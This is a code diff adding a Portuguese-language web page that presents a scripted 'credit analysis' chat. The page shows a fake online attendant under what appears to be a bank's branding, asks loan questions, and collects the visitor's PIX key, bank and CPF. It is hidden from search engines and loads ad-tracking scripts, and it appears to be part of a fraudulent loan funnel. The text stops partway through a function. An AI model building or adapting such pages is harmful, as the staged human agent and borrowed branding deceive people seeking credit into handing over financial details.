@@ -1,0 +1,1195 @@
+﻿<!DOCTYPE html><html lang="pt-BR">
+<head>
+  <script src="../js/utm.js"></script>
+<script src="../js/tracking.js"></script>
+<script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids async="" defer=""></script>
+  <meta charset="utf-8">
+  <meta name="robots" content="noindex, nofollow">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+  <title>Análise de Crédito</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&amp;family=Hind+Siliguri:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+  <script src="../../fluxo.js"></script>
+  <style>
+    :root {
+      --primary: #333333;
+      --primary-deep: #333333;
+      --primary-light: #fef0e4;
+      --accent: #0099FF;
+      --accent-yellow: #0099FF;
+      --accent-gold: #0066CC;
+      --green-accent: #4ab969;
+      --green-accent-dark: #4ab969;
+      --green-accent-light: #DCFCE7;
+      --green-primary: #111827;
+      --green-dark: #1F2937;
+      --green-darker: #374151;
+      --ParceiroChat-light: #dcf8c6;
+      --bg: #e5ddd5;
+      --text: #1f2937;
+      --text-light: #6b7280;
+      font-family: 'Hind Siliguri', sans-serif;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+    html { height: 100%; width: 100%; }
+    
+    body {
+      height: 100%; width: 100%; background: #F4F5F7; color: var(--text);
+      -webkit-font-smoothing: antialiased; display: flex; flex-direction: column;
+      overflow: hidden; position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+    }
+
+    header.header {
+      background: #FFFFFF;
+      padding: 14px 16px; width: 100%; z-index: 1000;
+      box-shadow: 0 1px 0 #E5E7EB; flex-shrink: 0;
+    }
+    .header-content { display: flex; align-items: center; justify-content: space-between; gap: 16px; }
+    .header-left { display: flex; align-items: center; gap: 14px; }
+    .menu-icon {
+      width: 40px; height: 40px; background: #F3F4F6;
+      border-radius: 12px; display: flex; align-items: center; justify-content: center;
+      cursor: pointer; transition: all 0.2s ease; border: 1px solid #E5E7EB;
+    }
+    .menu-icon:hover { background: #E5E7EB; transform: scale(1.05); }
+    .menu-icon svg { width: 18px; height: 18px; color:#4b5563; stroke-width: 2.5; }
+    .logo { display: flex; align-items: center; user-select: none; }
+    .logo-cred { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:20px; color:#111827; letter-spacing:-0.5px; line-height:1; }
+    .logo-diamond { width:7px; height:7px; background:#0099FF; transform:rotate(45deg); margin:0 8px; border-radius:1.5px; flex-shrink:0; }
+    .logo-on { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:20px; color:#333333; letter-spacing:-0.5px; line-height:1; }
+    .user-info { display: flex; flex-direction: column; align-items: flex-end; gap: 1px; }
+    .user-name { font-size: 13px; font-weight: 600; color: #111827; max-width: 120px; }
+    .user-cpf { font-size: 11px; color: #6B7280; letter-spacing: 0.3px; }
+    .user-icon-wrapper {
+      width: 40px; height: 40px; background: #fef0e4;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      border: 2px solid #0099FF; color: #0099FF;
+    }
+    .user-icon-wrapper svg { width: 20px; height: 20px; color: #0099FF; }
+    .header-right { display: flex; align-items: center; gap: 10px; }
+
+    .main-content {
+      flex: 1; display: flex; align-items: center; justify-content: center;
+      padding: 12px; overflow: hidden; min-height: 0;
+    }
+
+    .chat-container {
+      background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+      display: flex; flex-direction: column; width: 94%; max-width: 420px; margin: 0 auto;
+      height: 100%; max-height: min(680px, calc(100% - 20px)); overflow: hidden; position: relative;
+    }
+
+    .chat-header {
+      background: #075E54;
+      padding: 10px 16px; display: flex; align-items: center; gap: 12px;
+      flex-shrink: 0;
+    }
+    .chat-header-back {
+      width: 32px; height: 32px; display: flex; align-items: center; justify-content: center;
+      color: white; cursor: pointer;
+    }
+    .chat-header-back svg { width: 24px; height: 24px; }
+    .attendant-avatar {
+      width: 44px; height: 44px; border-radius: 50%;
+      border: 2px solid #333333; object-fit: cover;
+    }
+    .attendant-info { flex: 1; }
+    .attendant-info h3 { font-size: 16px; font-weight: 600; color: white; margin: 0; }
+    .attendant-info p { font-size: 13px; font-weight: 400; color: rgba(255,255,255,0.8); margin: 0; }
+
+    .chat-messages {
+      flex: 1; overflow-y: auto; overflow-x: hidden; padding: 14px;
+      background: #e5ddd5 url("images/fundozap2.jpg") center/cover;
+      display: flex; flex-direction: column; gap: 12px;
+      -webkit-overflow-scrolling: touch; overscroll-behavior: contain;
+    }
+    .chat-messages::-webkit-scrollbar { width: 6px; }
+    .chat-messages::-webkit-scrollbar-track { background: transparent; }
+    .chat-messages::-webkit-scrollbar-thumb { background: rgba(0,0,0,0.2); border-radius: 3px; }
+
+    .message { display: flex; gap: 6px; animation: slideIn 0.3s ease; max-width: 85%; }
+    @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+    .message.attendant { align-self: flex-start; }
+    .message.user { align-self: flex-end; flex-direction: row-reverse; }
+    .message-avatar { width: 36px; height: 36px; border-radius: 50%; object-fit: cover; flex-shrink: 0; box-shadow: 0 2px 6px rgba(0,0,0,0.15); align-self: flex-end; border: 2px solid #333333; }
+    .user-avatar { width: 36px; height: 36px; border-radius: 50%; background: #333333; display: flex; align-items: center; justify-content: center; flex-shrink: 0; box-shadow: 0 2px 6px rgba(0,0,0,0.15); align-self: flex-end; }
+    .user-avatar svg { width: 18px; height: 18px; color: white; }
+    .message-bubble { 
+      max-width: 100%; padding: 8px 12px; border-radius: 8px; position: relative;
+      box-shadow: 0 1px 1px rgba(0,0,0,0.08);
+    }
+    .message.attendant .message-bubble { 
+      background: white; 
+      border-top-left-radius: 0;
+    }
+    .message.attendant .message-bubble::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -8px;
+      width: 0;
+      height: 0;
+      border-top: 0px solid transparent;
+      border-bottom: 10px solid transparent;
+      border-right: 8px solid white;
+    }
+    .message.user .message-bubble { 
+      background: #d9fdd3; 
+      border-top-right-radius: 0;
+    }
+    .message.user .message-bubble::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      right: -8px;
+      width: 0;
+      height: 0;
+      border-top: 0px solid transparent;
+      border-bottom: 10px solid transparent;
+      border-left: 8px solid #d9fdd3;
+    }
+    .message-name { font-size: 13px; font-weight: 600; color: #1fa855; margin-bottom: 2px; }
+    .message-text { font-size: 14.5px; line-height: 1.4; color: #111b21; }
+    .message-time { font-size: 11px; color: #667781; margin-top: 3px; text-align: right; display: flex; align-items: center; justify-content: flex-end; gap: 4px; }
+    .message.user .message-name { color: var(--green-accent-dark); }
+
+    .typing-indicator { display: flex; gap: 5px; padding: 4px 0; align-items: center; }
+    .typing-dot { width: 8px; height: 8px; background: #8696a0; border-radius: 50%; animation: typingBounce 1.4s infinite ease-in-out; }
+    .typing-dot:nth-child(1) { animation-delay: 0s; }
+    .typing-dot:nth-child(2) { animation-delay: 0.2s; }
+    .typing-dot:nth-child(3) { animation-delay: 0.4s; }
+    @keyframes typingBounce { 0%, 60%, 100% { transform: translateY(0); } 30% { transform: translateY(-6px); } }
+
+    .options-container { display: flex; flex-wrap: wrap; justify-content: flex-end; gap: 8px; margin-top: 4px; padding: 0 8px; }
+    .option-button {
+      background: #d9fdd3; border: 1px solid #b7e4ae; color: #111b21;
+      padding: 11px 16px; border-radius: 18px 18px 4px 18px; font-size: 15px; font-weight: 500;
+      cursor: pointer; transition: all 0.15s; font-family: 'Hind Siliguri', sans-serif;
+      text-align: right; max-width: 100%; box-shadow: 0 1px 1px rgba(0,0,0,0.08);
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
+    }
+    .option-button:active {
+      background: #b7e4ae;
+      transform: scale(0.97);
+    }
+    .option-button.destaque { background: #00a884; border-color: #00a884; color: #fff; }
+    .option-button.destaque:active { background: #008f6f; border-color: #008f6f; }
+    .option-button.recusar { background: #e53935; border-color: #e53935; color: #fff; }
+    .option-button.recusar:active { background: #c62828; border-color: #c62828; }
+    .options-grid { display: flex; flex-direction: column; align-items: flex-start; gap: 8px; margin-top: 6px; padding: 0 16px; }
+    .option-card {
+      background: #fff; border: 1px solid #fde0c8; color: #1f2937;
+      width: 300px; max-width: 86%;
+      border-radius: 12px; padding: 13px 14px; font-size: 15px; font-weight: 500;
+      cursor: pointer; transition: all 0.15s; font-family: 'Hind Siliguri', sans-serif;
+      display: flex; flex-direction: row; align-items: center; gap: 12px; text-align: left;
+      -webkit-tap-highlight-color: transparent; -webkit-user-select: none; user-select: none;
+    }
+    .option-card .option-label { flex: 1; }
+    .option-card .option-ic { width: 21px; height: 21px; color: #0099FF; stroke-width: 1.8; flex-shrink: 0; }
+    .option-card .option-chevron { width: 18px; height: 18px; color: #0099FF; stroke-width: 2; flex-shrink: 0; }
+    .option-card:active { background: #fef0e4; border-color: #0099FF; transform: scale(0.99); }
+    .option-card.sim { border-color: #3da55b; background: #eafaf3; }
+    .option-card.sim .option-ic, .option-card.sim .option-chevron { color: #3da55b; }
+    .option-card.nao { border-color: #e05252; background: #fdeded; }
+    .option-card.nao .option-ic, .option-card.nao .option-chevron { color: #d64545; }
+    .option-card:disabled { opacity: 0.5; }
+    .input-container {
+      background: #f0f2f5; padding: 6px 10px; display: flex; align-items: center;
+      gap: 8px; flex-shrink: 0;
+    }
+    .input-wrapper { flex: 1; position: relative; display: flex; align-items: center; }
+    .chat-input {
+      width: 100%; border: none; outline: none; font-size: 16px;
+      font-family: 'Hind Siliguri', sans-serif; padding: 12px 16px; background: white;
+      border-radius: 24px; min-height: 48px; max-height: 48px;
+    }
+    .chat-input::placeholder { color: #8696a0; }
+    .send-btn {
+      width: 48px; height: 48px; background: var(--green-accent); border: none;
+      border-radius: 50%; display: flex; align-items: center; justify-content: center;
+      cursor: pointer; flex-shrink: 0; transition: all 0.15s;
+    }
+    .send-btn:active { background: var(--green-accent-dark); transform: scale(0.92); }
+    .send-btn svg { width: 22px; height: 22px; color: white; }
+
+    .autocomplete-list {
+      position: absolute; bottom: 100%; left: 0; right: 0; background: white;
+      border-radius: 12px; box-shadow: 0 -4px 12px rgba(0,0,0,0.15);
+      max-height: 150px; overflow-y: auto; margin-bottom: 8px; z-index: 100; display: none;
+    }
+    .autocomplete-item { padding: 12px 16px; cursor: pointer; border-bottom: 1px solid #f0f2f5; font-size: 14px; }
+    .autocomplete-item:active { background: var(--green-accent-light); }
+    .autocomplete-item:last-child { border-bottom: none; }
+
+    .loading-container {
+      display: none; flex-direction: column; align-items: center; justify-content: center;
+      padding: 40px 20px; gap: 20px; background: white; border-radius: 16px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 94%; max-width: 390px;
+      height: 100%; max-height: 680px;
+    }
+    .loading-spinner { width: 50px; height: 50px; border: 4px solid #fef0e4; border-top: 4px solid #0099FF; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { font-size: 16px; font-weight: 600; color: #111827; text-align: center; }
+
+    .installments-box {
+      flex-shrink: 0;
+      margin: 8px;
+      background: #fff;
+      border-radius: 20px;
+      overflow: hidden;
+      border: 1px solid rgba(0,0,0,.06);
+      box-shadow: 0 10px 30px -12px rgba(0,0,0,.18), 0 1px 3px rgba(0,0,0,.06);
+      font-family: 'Hind Siliguri', sans-serif;
+      color: #333333;
+    }
+    .ib-head { padding: 11px 16px 8px; border-bottom: 1px solid #F0F0F4; }
+    .ib-label { font-size: 10px; letter-spacing: 1.2px; text-transform: uppercase; color: #8A8FA0; font-weight: 600; }
+    .ib-sub { font-size: 12px; color: #6B7280; margin-top: 2px; }
+    .ib-sub b { color: #333333; font-weight: 700; }
+    .ib-row {
+      display: flex; align-items: center; gap: 10px;
+      padding: 7px 16px; cursor: pointer;
+      border-top: 1px solid #F3F3F7;
+      transition: background .15s;
+    }
+    .ib-row:first-child { border-top: 0; }
+    .ib-row.selected { background: #fef0e4; }
+    .ib-radio {
+      width: 17px; height: 17px; border-radius: 50%;
+      border: 2px solid #D1D5DB; flex-shrink: 0;
+      display: grid; place-items: center; transition: all .15s;
+    }
+    .ib-row.selected .ib-radio { border-color: #0A0047; background: #0A0047; }
+    .ib-row.selected .ib-radio::after { content: ''; width: 6px; height: 6px; border-radius: 50%; background: #fff; }
+    .ib-info { flex: 1; min-width: 0; }
+    .ib-months { font-size: 14px; font-weight: 700; display: flex; align-items: center; gap: 6px; }
+    .ib-tag {
+      font-size: 8px; font-weight: 700; letter-spacing: .4px; text-transform: uppercase;
+      background: #0A0047; color: #fff; padding: 2px 5px; border-radius: 5px; white-space: nowrap;
+    }
+    .ib-total { font-size: 10px; color: #9CA3AF; margin-top: 0; }
+    .ib-value { font-size: 15px; font-weight: 800; white-space: nowrap; font-variant-numeric: tabular-nums; }
+    .ib-footer { padding: 2px 14px 12px; }
+    .ib-confirm {
+      width: 100%; margin-top: 8px; padding: 12px;
+      background: #0099FF; color: #fff; border: none; border-radius: 12px;
+      font-size: 15px; font-weight: 700; font-family: 'Hind Siliguri', sans-serif; cursor: pointer;
+      box-shadow: 0 8px 20px -6px rgba(0,153,255,.55);
+      transition: transform .2s, background .2s;
+    }
+    .ib-confirm:hover { background: #0066CC; }
+    .ib-confirm:active { transform: scale(.98); }
+
+    /* Score */
+    .score-box {
+      flex-shrink: 0; align-self: center; width: 100%; max-width: 320px; margin: 8px 0;
+      background: #fff; border-radius: 20px; padding: 18px 18px 16px;
+      border: 1px solid rgba(0,0,0,.06);
+      box-shadow: 0 10px 30px -12px rgba(0,0,0,.18), 0 1px 3px rgba(0,0,0,.06);
+      font-family: 'Hind Siliguri', sans-serif; color: #333333; text-align: center;
+    }
+    .score-title { font-size: 11px; letter-spacing: 1.4px; text-transform: uppercase; color: #8A8FA0; font-weight: 600; }
+    .score-gauge { position: relative; width: 240px; max-width: 100%; margin: 10px auto 0; }
+    .score-gauge svg { display: block; width: 100%; height: auto; overflow: visible; }
+    .score-center { margin-top: 6px; }
+    .score-number { font-family: 'Poppins', 'Hind Siliguri', sans-serif; font-size: 44px; font-weight: 800; letter-spacing: -1.5px; line-height: 1; font-variant-numeric: tabular-nums; }
+    .score-of { font-size: 11px; color: #9CA3AF; margin-top: 2px; }
+    .score-ends { display: flex; justify-content: space-between; width: 240px; max-width: 100%; margin: 4px auto 0; padding: 0 9px 0 16px; font-size: 10px; color: #9CA3AF; font-weight: 600; }
+    .score-person { margin-top: 14px; padding-top: 12px; border-top: 1px solid #F0F0F4; display: flex; flex-direction: column; gap: 6px; }
+    .score-person div { display: flex; justify-content: space-between; align-items: baseline; gap: 12px; font-size: 12px; }
+    .score-person span { color: #9CA3AF; flex-shrink: 0; }
+    .score-person b { color: #333333; font-weight: 700; text-align: right; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0; }
+    .score-status {
+      display: inline-block; margin-top: 12px; padding: 5px 14px; border-radius: 20px;
+      font-size: 12px; font-weight: 700; background: #F3F4F6; color: #6B7280; transition: all .3s;
+    }
+
+    /* Slider de valor */
+    .slider-container { padding: 8px; margin-top: 8px; }
+    .slider-card {
+      background: #fff;
+      border-radius: 22px;
+      padding: 24px 20px 20px;
+      box-shadow: 0 10px 30px -12px rgba(0,0,0,.18), 0 1px 3px rgba(0,0,0,.06);
+      border: 1px solid rgba(0,0,0,.06);
+      font-family: 'Hind Siliguri', sans-serif;
+      color: #333333;
+    }
+    .slider-header { text-align: center; }
+    .slider-label {
+      font-size: 11px;
+      color: #8A8FA0;
+      text-transform: uppercase;
+      letter-spacing: 1.6px;
+      font-weight: 600;
+    }
+    .slider-value-display {
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      gap: 6px;
+      margin-top: 6px;
+      color: #333333;
+      line-height: 1;
+    }
+    .slider-value-display .cur {
+      font-size: 18px;
+      font-weight: 700;
+      color: #0099FF;
+      margin-top: 6px;
+    }
+    .slider-value-display .num {
+      font-family: 'Poppins', 'Hind Siliguri', sans-serif;
+      font-size: 42px;
+      font-weight: 800;
+      letter-spacing: -1.5px;
+    }
+    .amount-slider {
+      -webkit-appearance: none;
+      appearance: none;
+      display: block;
+      width: 100%;
+      height: 8px;
+      margin: 22px 0 10px;
+      border-radius: 8px;
+      background: #EEF0F4;
+      outline: none;
+      cursor: pointer;
+    }
+    .amount-slider::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 28px; height: 28px;
+      background: #fff;
+      border: 6px solid #0099FF;
+      border-radius: 50%;
+      cursor: grab;
+      box-shadow: 0 3px 10px rgba(0,153,255,.45);
+      transition: transform .15s;
+    }
+    .amount-slider::-webkit-slider-thumb:active { cursor: grabbing; transform: scale(1.12); }
+    .amount-slider::-moz-range-thumb {
+      width: 16px; height: 16px;
+      background: #fff;
+      border: 6px solid #0099FF;
+      border-radius: 50%;
+      cursor: grab;
+      box-shadow: 0 3px 10px rgba(0,153,255,.45);
+    }
+    .slider-limits {
+      display: flex;
+      justify-content: space-between;
+      font-size: 11px;
+      color: #9CA3AF;
+      font-weight: 500;
+    }
+    .installments-preview {
+      margin-top: 20px;
+      background: #F8F8FB;
+      border: 1px solid #EEEEF4;
+      border-radius: 16px;
+      padding: 12px 6px 14px;
+    }
+    .installments-preview-title {
+      font-size: 11px;
+      font-weight: 600;
+      color: #8A8FA0;
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .installments-preview-row {
+      display: grid;
+      grid-template-columns: repeat(4, minmax(0, 1fr));
+    }
+    .ip-col { text-align: center; padding: 0 2px; }
+    .ip-col + .ip-col { border-left: 1px solid #E8E8EF; }
+    .ip-months {
+      display: inline-block;
+      font-size: 11px;
+      font-weight: 700;
+      color: #333333;
+      background: #0A0047;
+      color: #fff;
+      padding: 2px 8px;
+      border-radius: 20px;
+    }
+    .ip-value {
+      font-size: 14px;
+      font-weight: 700;
+      color: #333333;
+      margin-top: 8px;
+      white-space: nowrap;
+      font-variant-numeric: tabular-nums;
+    }
+    .ip-value small { font-size: 10px; font-weight: 600; color: #8A8FA0; margin-right: 1px; }
+    .ip-sub { font-size: 10px; color: #9CA3AF; margin-top: 1px; }
+    .slider-note {
+      font-size: 11px;
+      color: #9CA3AF;
+      text-align: center;
+      margin-top: 10px;
+    }
+    .slider-confirm-btn {
+      width: 100%;
+      margin-top: 16px;
+      padding: 16px;
+      background: #0099FF;
+      color: #fff;
+      border: none;
+      border-radius: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Hind Siliguri', sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: transform .2s, box-shadow .2s, background .2s;
+      box-shadow: 0 8px 20px -6px rgba(0,153,255,.55);
+    }
+    .slider-confirm-btn:hover { background: #0066CC; }
+    .slider-confirm-btn:active { transform: scale(.98); }
+    .slider-confirm-btn svg { width: 18px; height: 18px; }
+
+    .pix-receipt { background: white; border-radius: 16px; padding: 24px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); max-width: 350px; margin: 0 auto; }
+    .receipt-header { text-align: center; padding-bottom: 20px; border-bottom: 2px dashed #e5e7eb; margin-bottom: 20px; }
+    .receipt-logo { display: none; }
+    .receipt-logo-text { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:18px; color:#111827; letter-spacing:-0.5px; display:inline-block; }
+    .receipt-logo-diamond { width:6px; height:6px; background:#0099FF; transform:rotate(45deg); margin:0 6px; border-radius:1px; display:inline-block; vertical-align:middle; }
+    .receipt-logo-on { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:18px; color:#333333; letter-spacing:-0.5px; display:inline-block; }
+    .receipt-title { font-size: 18px; font-weight: 700; color: #111827; margin-bottom: 4px; }
+    .receipt-status { display: inline-flex; align-items: center; gap: 6px; background: var(--green-accent-light); color: var(--green-primary); padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-top: 8px; }
+    .receipt-status svg { width: 16px; height: 16px; color: var(--green-accent); }
+    .receipt-row { display: flex; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid #f3f4f6; }
+    .receipt-row:last-child { border-bottom: none; }
+    .receipt-label { font-size: 13px; color: var(--text-light); font-weight: 500; }
+    .receipt-value { font-size: 13px; color: var(--text); font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
+    .receipt-amount { background: #FAFBFC; border: 1.5px solid #E5E7EB; padding: 16px; border-radius: 12px; text-align: center; margin: 16px 0; }
+    .receipt-amount-label { font-size: 12px; color: #6B7280; margin-bottom: 4px; }
+    .receipt-amount-value { font-size: 28px; font-weight: 700; color: #111827; }
+    .receipt-footer { text-align: center; padding-top: 16px; border-top: 2px dashed #e5e7eb; margin-top: 16px; font-size: 11px; color: var(--text-light); }
+
+    footer.site-footer { background: #FFFFFF; color: #6B7280; padding: 20px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; z-index: 999; border-top: 1px solid #E5E7EB; }
+    .footer-inner { max-width: 100%; width: 100%; display: flex; flex-direction: column; align-items: center; gap: 8px; }
+    .footer-logo { display: flex; align-items: center; user-select: none; }
+    .footer-logo .f-logo-cred { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:15px; color:#6B7280; letter-spacing:-0.5px; }
+    .footer-logo .f-logo-diamond { width:5px; height:5px; background:#6B7280; transform:rotate(45deg); margin:0 6px; border-radius:1px; display:inline-block; vertical-align:middle; }
+    .footer-logo .f-logo-on { font-family:'Hind Siliguri','Poppins','Poppins',sans-serif; font-weight:800; font-size:15px; color:#333333; letter-spacing:-0.5px; }
+    footer small { font-size: 11px; opacity: 0.75; text-align: center; line-height: 1.5; }
+    footer small strong { color: #333333; font-weight: 600; }
+    .footer-badges { display: flex; align-items: center; gap: 16px; margin-top: 4px; }
+    .footer-badges span { display: flex; align-items: center; gap: 4px; font-size: 10px; color: #9CA3AF; font-weight: 500; }
+    .footer-badges svg { width: 12px; height: 12px; color: #9CA3AF; }
+
+    .input-container.hidden { display: none; }
+      .header-logo { height:36px; width:auto; }
+    .logo-tagline { font-family:'Hind Siliguri','Poppins',sans-serif; font-weight:600; font-size:7px; letter-spacing:2.5px; text-transform:uppercase; color:#6B7280; margin-top:1px; }
+    .footer-tagline { font-family:'Hind Siliguri','Poppins',sans-serif; font-weight:600; font-size:6px; letter-spacing:2px; text-transform:uppercase; color:#9CA3AF; margin-top:1px; }
+  
+</style>
+</head>
+<body>
+  <header class="header">
+    <div class="header-content">
+      <div class="header-left">
+        <div class="menu-icon">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+          </svg>
+        </div>
+        <img src="../images/logo.png" alt="Porto" class="header-logo">
+      </div>
+      <div class="header-right">
+        <div class="user-info">
+          <span class="user-name" id="userName">Carregando...</span>
+          <span class="user-cpf" id="userCpf">***.***.***-**</span>
+        </div>
+        <div class="user-icon-wrapper">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <div class="main-content">
+    <div class="chat-container" id="chatContainer">
+      <div class="chat-header">
+        <div class="chat-header-back" onclick="history.back()">
+          <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
+        </div>
+        <img src="../images/atendente.png" alt="Fabiola Gonzalez" class="attendant-avatar">
+        <div class="attendant-info"><h3>Fabiola Gonzalez</h3><p><span style="display:inline-block;width:8px;height:8px;background:#25d366;border-radius:50%;margin-right:4px;vertical-align:middle;"></span>online</p></div>
+      </div>
+      <div class="chat-messages" id="chatMessages"></div>
+      
+      <div class="input-container hidden" id="inputContainer">
+        <div class="input-wrapper">
+          <input type="text" class="chat-input" id="chatInput" placeholder="Digite aqui..." autocomplete="off" enterkeyhint="send">
+          <div class="autocomplete-list" id="autocompleteList"></div>
+        </div>
+        <button class="send-btn" id="sendBtn" type="button">
+          <svg viewBox="0 0 24 24" width="22" height="22" fill="white"><path d="M1.101 21.757L23.8 12.028 1.101 2.3l.011 7.912 13.623 1.816-13.623 1.817-.011 7.912z"></path></svg>
+        </button>
+      </div>
+    </div>
+    
+    <div class="loading-container" id="loadingContainer">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Analisando suas informações...<br><small>Aguarde um momento</small></div>
+    </div>
+  </div>
+
+  <script>
+    let userName = 'Cliente';
+    let currentQuestion = 0;
+    let currentInputMode = null;
+    
+    const questions = [
+      { text: 'Olá! Para finalizar sua análise, preciso fazer algumas perguntas rápidas. Qual o principal motivo do seu empréstimo?', options: ['Pagar dívidas', 'Investir no negócio', 'Reformar a casa', 'Emergência médica'] },
+      { text: 'Perfeito! Você possui conta bancária ativa em seu nome?', options: ['Sim, em banco tradicional', 'Sim, em banco digital', 'Sim, em ambos', 'Vou abrir uma conta'] },
+      { text: 'Ótimo! Agora preciso saber onde você quer receber o dinheiro. Qual tipo de chave PIX você prefere usar?', options: ['CPF', 'Celular', 'E-mail', 'Chave Aleatória'], type: 'pix' },
+      { text: 'Última pergunta! Quando pretende começar a pagar as parcelas?', options: ['Em 30 dias', 'Em 60 dias', 'Em 90 dias'] }
+    ];
+
+    const bancosData = ['Banco do Brasil', 'Bradesco', 'Caixa Econômica Federal', 'Itaú Unibanco', 'Santander', 'Nubank', 'Inter', 'C6 Bank', 'Neon', 'Next', 'PagBank', 'Mercado Pago', 'BTG Pactual', 'Safra', 'Sicoob', 'Sicredi', 'Banco Original', 'Banco Pan', 'Porto', 'Daycoval', 'Banrisul', 'BRB', 'Banestes', 'Banco da Amazônia', 'Banco do Nordeste', 'BNDES', 'Agibank', 'Banco Votorantim', 'Sofisa', 'BS2'];
+
+    let selectedPixType = '', pixKey = '', bankName = '', selectedLoanAmount = 0, selectedInstallments = 0, selectedMonthlyPayment = 0;
+
+    const chatMessages = document.getElementById('chatMessages');
+    const inputContainer = document.getElementById('inputContainer');
+    const chatInput = document.getElementById('chatInput');
+    const sendBtn = document.getElementById('sendBtn');
+    const autocompleteList = document.getElementById('autocompleteList');
+
+    function scrollToBottom() { requestAnimationFrame(() => { chatMessages.scrollTop = chatMessages.scrollHeight; }); }
+
+    function showInput(mode, placeholder) {
+      currentInputMode = mode;
+      chatInput.value = '';
+      chatInput.placeholder = placeholder;
+      inputContainer.classList.remove('hidden');
+      autocompleteList.style.display = 'none';
+      if (mode === 'amount') { chatInput.inputMode = 'numeric'; chatInput.maxLength = 6; }
+      else if (mode === 'confirmation') { chatInput.inputMode = 'text'; chatInput.maxLength = 3; }
+      else { chatInput.inputMode = 'text'; chatInput.maxLength = 100; }
+      setTimeout(scrollToBottom, 100);
+    }
+
+    function hideInput() { currentInputMode = null; inputContainer.classList.add('hidden'); autocompleteList.style.display = 'none'; chatInput.blur(); }
+
+    sendBtn.addEventListener('click', handleSend);
+    chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') { e.preventDefault(); handleSend(); } });
+    chatInput.addEventListener('input', (e) => {
+      const value = e.target.value;
+      if (currentInputMode === 'bank') {
+        const search = value.toLowerCase().trim();
+        if (search.length > 0) {
+          const filtered = bancosData.filter(b => b.toLowerCase().includes(search));
+          if (filtered.length > 0) {
+            autocompleteList.innerHTML = filtered.map(b => `<div class="autocomplete-item" data-bank="${b}">${b}</div>`).join('');
+            autocompleteList.style.display = 'block';
+          } else { autocompleteList.style.display = 'none'; }
+        } else { autocompleteList.style.display = 'none'; }
+      } else if (currentInputMode === 'amount') {
+        let num = value.replace(/\D/g, '');
+        if (num.length > 5) num = num.substring(0, 5);
+        const n = parseInt(num) || 0;
+        e.target.value = n > 30000 ? '30000' : num;
+      } else if (currentInputMode === 'confirmation') { e.target.value = value.toUpperCase(); }
+    });
+
+    autocompleteList.addEventListener('click', (e) => { if (e.target.classList.contains('autocomplete-item')) { chatInput.value = e.target.dataset.bank; autocompleteList.style.display = 'none'; } });
+
+    function handleSend() {
+      const value = chatInput.value.trim();
+      if (!value) return;
+      switch (currentInputMode) {
+        case 'pix': sendPixKey(value); break;
+        case 'bank': sendBank(value); break;
+        case 'confirmation': sendConfirmation(value); break;
+      }
+    }
+
+    function loadUserData() {
+      const n = localStorage.getItem('nome');
+      if (n) {
+        const ns = n.trim().split(' ');
+        userName = ns[0];
+        const u = ns.length > 1 ? ns[ns.length - 1] : '';
+        document.getElementById('userName').textContent = u ? `${ns[0]} ${u}` : ns[0];
+        questions[0].text = `Olá ${userName}! Para finalizar sua análise, preciso fazer algumas perguntas rápidas. Qual o principal motivo do seu empréstimo?`;
+      }
+      const c = localStorage.getItem('cpf');
+      if (c) {
+        const cl = c.replace(/\D/g, '');
+        if (cl.length === 11) { document.getElementById('userCpf').textContent = `${cl.substring(0,3)}.${cl.substring(3,6)}.${cl.substring(6,9)}-${cl.substring(9,11)}`; }
+      }
+    }
+
+    function addMessage(text, isUser = false, showOptions = false) {
+      const m = document.createElement('div');
+      m.className = `message ${isUser ? 'user' : 'attendant'}`;
+      if (isUser) {
